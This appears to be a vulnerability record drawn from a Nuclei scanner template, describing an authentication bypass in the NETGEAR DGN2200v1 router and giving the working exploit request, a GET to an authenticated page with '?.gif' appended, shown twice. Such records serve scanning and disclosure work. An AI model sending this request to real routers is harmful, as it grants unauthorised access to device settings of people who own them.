# Vulnerability: NETGEAR DGN2200v1 - Authentication Bypass
**Classification:** CWE-287
**Source:** Nuclei Template (`netgear-router-auth-bypass.yaml`)

## Description
NETGEAR DGN2200v1 router contains an authentication bypass vulnerability. It does not require authentication if a page has ".jpg", ".gif", or "ess_" substrings but matches the entire URL. Any page on the device can therefore be accessed, including those that require authentication, by appending a GET variable with the relevant substring.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /WAN_wan.htm?.gif HTTP/1.1
Host: {{Hostname}}
Accept: */*

GET /WAN_wan.htm?.gif HTTP/1.1
Host: {{Hostname}}
Accept: */*
```

